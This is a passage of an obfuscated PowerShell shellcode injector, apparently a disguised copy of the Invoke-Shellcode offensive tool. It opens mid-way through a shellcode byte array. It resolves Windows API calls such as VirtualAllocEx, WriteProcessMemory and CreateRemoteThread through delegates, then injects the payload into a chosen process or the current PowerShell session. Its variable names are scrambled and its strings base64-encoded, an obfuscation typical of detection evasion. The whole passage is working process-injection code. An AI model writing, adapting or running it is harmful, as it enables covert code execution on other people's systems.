                                  0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                                  0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
                                  0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00)
    }
    if ( $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQA')))] )
    {
        ${91ebd867fd9541d387fab6fae69d1457} = Get-ProcAddress kernel32.dll OpenProcess
        ${4dc2fb1f85e245eaac068c68c51d77bd} = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        ${3ebe29a2fe6b4585ae05f269775ede9e} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${91ebd867fd9541d387fab6fae69d1457}, ${4dc2fb1f85e245eaac068c68c51d77bd})
        ${c4eebcbe613d4b89b02665f9d5a8e2e7} = Get-ProcAddress kernel32.dll VirtualAllocEx
        ${52e3718fd2c04b34b2c24b0caef110ef} = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
        ${8db0f45eca4f44feaf866f2cd42efd1b} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${c4eebcbe613d4b89b02665f9d5a8e2e7}, ${52e3718fd2c04b34b2c24b0caef110ef})
        ${ad4947a83c084cd980c637bffd04e08d} = Get-ProcAddress kernel32.dll WriteProcessMemory
        ${928724ecfd9a435394fa6f2562a108a3} = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        ${99cd331d99df48e8ae580253e8b17169} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${ad4947a83c084cd980c637bffd04e08d}, ${928724ecfd9a435394fa6f2562a108a3})
        ${c0f03151a5b9489b9d0b106ee62ff1ee} = Get-ProcAddress kernel32.dll CreateRemoteThread
        ${7ba2f1c0231c4175ab350ae21b51a1a1} = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${9edf6540c07a449d85e95fc37d04768c} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${c0f03151a5b9489b9d0b106ee62ff1ee}, ${7ba2f1c0231c4175ab350ae21b51a1a1})
        ${04197b3fa4c841028b83c0b2a2a31177} = Get-ProcAddress kernel32.dll CloseHandle
        ${b77576c257d745d998c14c925f7a5522} = Get-DelegateType @([IntPtr]) ([Bool])
        ${4d80fc465d0f4c81a9f0510ed4e4a630} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${04197b3fa4c841028b83c0b2a2a31177}, ${b77576c257d745d998c14c925f7a5522})
        Write-Verbose "Injecting shellcode into PID: ${a1c827e2c0ed4a4889805491350137e2}"
        if ( ${bab5df81ac5040dbbbb4c01205f3b8e4} -or $psCmdlet.ShouldContinue( $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvACAAeQBvAHUAIAB3AGkAcwBoACAAdABvACAAYwBhAHIAcgB5ACAAbwB1AHQAIAB5AG8AdQByACAAZQB2AGkAbAAgAHAAbABhAG4AcwA/AA=='))),
                 "Injecting shellcode injecting into $((ps -Id ${a1c827e2c0ed4a4889805491350137e2}).ProcessName) (${a1c827e2c0ed4a4889805491350137e2})!" ) )
        {
            Inject-RemoteShellcode ${a1c827e2c0ed4a4889805491350137e2}
        }
    }
    else
    {
        ${eb694d8cd52a4868803f3b0f11bd411f} = Get-ProcAddress kernel32.dll VirtualAlloc
        ${f45d43d878b244adacf5eac2265ea365} = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
        ${eb933ced95a944428b16abca963b8087} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${eb694d8cd52a4868803f3b0f11bd411f}, ${f45d43d878b244adacf5eac2265ea365})
        ${d6a315bed6d84ae7b7127a9e88ec114f} = Get-ProcAddress kernel32.dll VirtualFree
        ${e5e8edb5b698425e95d7de05811cb49c} = Get-DelegateType @([IntPtr], [Uint32], [UInt32]) ([Bool])
        ${711707a94e3e4d0cb26eba626fed37bc} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${d6a315bed6d84ae7b7127a9e88ec114f}, ${e5e8edb5b698425e95d7de05811cb49c})
        ${4c452a9edce440a28d28cde08bb61173} = Get-ProcAddress kernel32.dll CreateThread
        ${58b0c7ec8c4c4c4fb9de23fbba5b819e} = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${56bc5f168ce04046907a2bb4ffc2497f} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${4c452a9edce440a28d28cde08bb61173}, ${58b0c7ec8c4c4c4fb9de23fbba5b819e})
        ${8c1dba931bbd41e6b828883396d210f4} = Get-ProcAddress kernel32.dll WaitForSingleObject
        ${02cc210f6b534ce4acb4e04fba7d503a} = Get-DelegateType @([IntPtr], [Int32]) ([Int])
        ${590b2e0764d34d65ba757e59bd6b00b4} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${8c1dba931bbd41e6b828883396d210f4}, ${02cc210f6b534ce4acb4e04fba7d503a})
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGoAZQBjAHQAaQBuAGcAIABzAGgAZQBsAGwAYwBvAGQAZQAgAGkAbgB0AG8AIABQAG8AdwBlAHIAUwBoAGUAbABsAA==')))
        if ( ${bab5df81ac5040dbbbb4c01205f3b8e4} -or $psCmdlet.ShouldContinue( $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvACAAeQBvAHUAIAB3AGkAcwBoACAAdABvACAAYwBhAHIAcgB5ACAAbwB1AHQAIAB5AG8AdQByACAAZQB2AGkAbAAgAHAAbABhAG4AcwA/AA=='))),
                 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGoAZQBjAHQAaQBuAGcAIABzAGgAZQBsAGwAYwBvAGQAZQAgAGkAbgB0AG8AIAB0AGgAZQAgAHIAdQBuAG4AaQBuAGcAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAcAByAG8AYwBlAHMAcwAhAA=='))) ) )
        {
            Inject-LocalShellcode
        }
    }   
}
